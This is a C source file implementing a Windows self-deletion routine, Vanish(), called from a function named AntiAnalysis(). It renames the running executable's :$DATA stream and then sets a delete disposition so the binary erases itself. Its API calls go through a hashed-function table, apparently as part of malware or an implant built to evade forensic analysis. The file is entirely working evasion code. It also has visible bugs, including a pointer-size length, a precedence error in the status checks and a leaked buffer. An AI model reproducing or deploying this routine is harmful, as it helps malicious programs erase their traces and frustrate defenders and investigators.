#include <windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"


extern API_HASHING g_Api;




BOOL Vanish() {


	WCHAR					szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE					hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
	NTSTATUS STATUS = 0;
	
	// allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
#ifdef DEBUG
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("allocated mem\n");
#endif

	// cleaning up the structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//--------------------------------------------------------------------------------------------------------------------------
	// marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;
#ifdef DEBUG
	PRINTA("marked for deletion\n");
#endif
	// setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
#ifdef DEBUG
	PRINTA("set the new data stream name buffer and size\n");
#endif
	//--------------------------------------------------------------------------------------------------------------------------

	// used to get the current file name
	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
#ifdef DEBUG
		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
	
	//--------------------------------------------------------------------------------------------------------------------------
	// RENAMING

	// openning a handle to the current file
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
#endif


	// renaming the data stream
	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
#endif


	STATUS = NtClose(hFile);
	if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
		PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
#endif 
		return EXIT_FAILURE;
	}

	//--------------------------------------------------------------------------------------------------------------------------
	// DELEING

	// openning a new handle to the current file
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		// in case the file is already deleted
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
#endif 
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[i] DELETING ...");
#endif 


	// marking for deletion after the file's handle is closed
	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
#endif 
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n\n");
#endif


	STATUS = NtClose(hFile);
	if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
		PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
#endif
		return FALSE;
	}

	//g_Api.pCloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------

	// freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}




BOOL AntiAnalysis() {


	if (!Vanish()) {	

	}
		

	return FALSE;
}